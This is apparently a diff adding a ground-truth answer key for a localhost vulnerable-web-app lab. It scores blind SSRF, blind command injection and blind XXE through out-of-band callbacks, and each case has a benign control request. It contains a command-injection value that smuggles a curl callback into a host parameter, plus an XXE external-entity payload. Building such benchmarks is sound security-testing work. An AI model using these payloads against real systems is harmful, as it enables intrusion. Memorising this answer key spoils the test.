@@ -1,0 +1,114 @@
+{
+  "lab": {
+    "base": "http://127.0.0.1:8899",
+    "oast": "http://127.0.0.1:8897",
+    "internal_ssrf_target": "http://127.0.0.1:8898/",
+    "reset_endpoint": "/__reset",
+    "control_token_file": ".control_token"
+  },
+  "note": "blind 专项 ground truth：三条都**不回显**，只能靠 OAST 带外回连判定。与 ground_truth.json 的 12 条分开报分 —— 那 12 条是「有回显、差分可判」，这 3 条是「无回显、必须带外」。对照组统一采用「同一端点 + 非恶意输入」，这样 control 失败只能归因于 payload，不会混入端点本身的通用行为。",
+  "vulns": [
+    {
+      "id": "BSSRF-01",
+      "class": "blind_ssrf",
+      "criterion": "outbound_service",
+      "severity": "high",
+      "request": {
+        "method": "GET",
+        "path": "/api/fetch-blind",
+        "params": {
+          "url": "http://127.0.0.1:8897/oast/bssrf01"
+        }
+      },
+      "assert": {
+        "type": "oast_hit",
+        "token": "bssrf01",
+        "ua": "MiniShopLab-Blind/2.0",
+        "wait": 5
+      },
+      "control": [
+        {
+          "method": "GET",
+          "path": "/api/fetch-blind",
+          "params": {
+            "url": "http://127.0.0.1:8898/"
+          }
+        }
+      ],
+      "control_assert": {
+        "type": "oast_not_hit",
+        "token": "bssrf01",
+        "ua": "MiniShopLab-Blind/2.0",
+        "wait": 2
+      }
+    },
+    {
+      "id": "BCMDI-01",
+      "class": "blind_command_injection",
+      "criterion": "command_execution",
+      "severity": "critical",
+      "request": {
+        "method": "GET",
+        "path": "/api/diag-blind",
+        "params": {
+          "host": "127.0.0.1 & curl -s -A MiniShopLab-Blind/2.0 http://127.0.0.1:8897/oast/bcmdi01"
+        }
+      },
+      "assert": {
+        "type": "oast_hit",
+        "token": "bcmdi01",
+        "ua": "MiniShopLab-Blind/2.0",
+        "wait": 5
+      },
+      "control": [
+        {
+          "method": "GET",
+          "path": "/api/diag-blind",
+          "params": {
+            "host": "127.0.0.1"
+          }
+        }
+      ],
+      "control_assert": {
+        "type": "oast_not_hit",
+        "token": "bcmdi01",
+        "ua": "MiniShopLab-Blind/2.0",
+        "wait": 2
+      }
+    },
+    {
+      "id": "XXE-01",
+      "class": "blind_xxe",
+      "criterion": "outbound_service",
+      "severity": "high",
+      "request": {
+        "method": "POST",
+        "path": "/xml",
+        "params": {
+          "xml": "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"http://127.0.0.1:8897/oast/xxe01\">]><r><id>1</id><name>&x;</name></r>"
+        }
+      },
+      "assert": {
+        "type": "oast_hit",
+        "token": "xxe01",
+        "ua": "MiniShopLab-Blind/2.0",
+        "wait": 5
+      },
+      "control": [
+        {
+          "method": "POST",
+          "path": "/xml",
+          "params": {
+            "xml": "<?xml version=\"1.0\"?><r><id>1</id><name>alice</name></r>"
+          }
+        }
+      ],
+      "control_assert": {
+        "type": "oast_not_hit",
+        "token": "xxe01",
+        "ua": "MiniShopLab-Blind/2.0",
+        "wait": 2
+      }
+    }
+  ]
+}
